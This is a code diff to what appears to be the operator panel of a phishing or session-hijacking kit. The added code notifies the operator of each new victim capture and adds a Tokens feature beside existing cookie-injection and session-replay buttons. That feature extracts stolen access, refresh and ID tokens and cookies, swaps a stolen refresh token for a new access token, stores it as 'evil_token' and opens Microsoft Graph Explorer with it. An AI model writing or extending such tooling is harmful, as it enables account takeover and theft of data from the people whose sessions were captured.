@@ -387,6 +387,20 @@
             border-color: #ffd700;
         }
 
+        .action-btn.replay:hover {
+    background: rgba(0, 255, 200, 0.1);
+    border-color: #00ffc8;
+    box-shadow: 0 0 20px rgba(0, 255, 200, 0.2);
+}
+.action-btn.token {
+    border-color: rgba(255, 215, 0, 0.2);
+    color: #ffd700;
+}
+.action-btn.token:hover {
+    background: rgba(255, 215, 0, 0.08);
+    border-color: #ffd700;
+}
+
         /* ----- Map & Chart ----- */
         .grid-2 {
             display: grid;
@@ -689,6 +703,20 @@
         };
     }
 
+    ws.onmessage = (event) => {
+    try {
+        const data = JSON.parse(event.data);
+        if (data.type === 'newLog') {
+            showToast('📥 New capture: ' + data.file);
+            refreshLogs();
+        } else if (data === 'pong' || data.type === 'pong') {
+            // Heartbeat response - ignore
+        }
+    } catch (e) {
+        // Not JSON, ignore
+    }
+};
+
     // ---------- HEARTBEAT (ping every 25s) ----------
     let heartbeatInterval;
     
@@ -745,7 +773,6 @@
     filtered.forEach(log => {
         const date = new Date(log.modified).toLocaleString();
         const row = document.createElement('tr');
-        // ✅ UPDATED: Added Replay button
         row.innerHTML = `
             <td><span class="badge">${log.name}</span></td>
             <td>${(log.size / 1024).toFixed(1)} KB</td>
@@ -756,6 +783,7 @@
                 <button class="action-btn" onclick="viewLog('${log.name}')">🔍 View</button>
                 <button class="action-btn cookie" onclick="injectCookies('${log.name}')">🍪 Inject</button>
                 <button class="action-btn replay" onclick="replaySession('${log.name}')" style="border-color:rgba(0,255,200,0.3);color:#00ffc8;">▶ Replay</button>
+                <button class="action-btn token" onclick="showTokens('${log.name}')" style="border-color:rgba(255,215,0,0.3);color:#ffd700;">🔑 Tokens</button>
             </td>
         `;
         tbody.appendChild(row);
@@ -966,7 +994,60 @@ async function replaySession(filename) {
     }
 }
 
-    // ---------- EXPORT ----------
+// ---------- SHOW TOKENS ----------
+async function showTokens(filename) {
+    try {
+        const res = await fetch(`/dash/api/tokens/${filename}`);
+        const data = await res.json();
+        if (data.error) {
+            showToast('❌ Token extraction failed: ' + data.error, true);
+            return;
+        }
+        const tokens = data.tokens;
+        let msg = `🔑 Extracted:\n`;
+        msg += `  • Access tokens: ${tokens.access_tokens.length}\n`;
+        msg += `  • Refresh tokens: ${tokens.refresh_tokens.length}\n`;
+        msg += `  • ID tokens: ${tokens.id_tokens.length}\n`;
+        msg += `  • Cookies: ${tokens.cookies.length}\n`;
+        msg += `  • Sessions: ${tokens.sessions.length}`;
+        
+        // If we have a refresh token, offer to exchange it
+        if (tokens.refresh_tokens.length > 0) {
+            msg += `\n\n🔄 Refresh token available. Click OK to exchange for a new access token.`;
+            if (confirm(msg + '\n\nExchange refresh token for new access token?')) {
+                await exchangeRefreshToken(tokens.refresh_tokens[0]);
+                return;
+            }
+        }
+        alert(msg);
+    } catch (e) {
+        showToast('❌ Token error: ' + e.message, true);
+    }
+}
+
+async function exchangeRefreshToken(refreshToken) {
+    try {
+        const response = await fetch('/dash/api/exchange', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ refresh_token: refreshToken })
+        });
+        const data = await response.json();
+        if (data.access_token) {
+            showToast(`✅ New access token obtained: ${data.access_token.slice(0, 30)}...`);
+            // Store token for later use
+            localStorage.setItem('evil_token', JSON.stringify(data));
+            // Open Graph Explorer
+            window.open(`https://developer.microsoft.com/en-us/graph/graph-explorer?token=${data.access_token}`, '_blank');
+        } else {
+            showToast('❌ Token exchange failed: ' + (data.error || 'Unknown error'), true);
+        }
+    } catch (e) {
+        showToast('❌ Exchange error: ' + e.message, true);
+    }
+}
+    
+   // ---------- EXPORT ----------
     async function exportAll() {
         try {
             const res = await fetch('/dash/api/export/all');
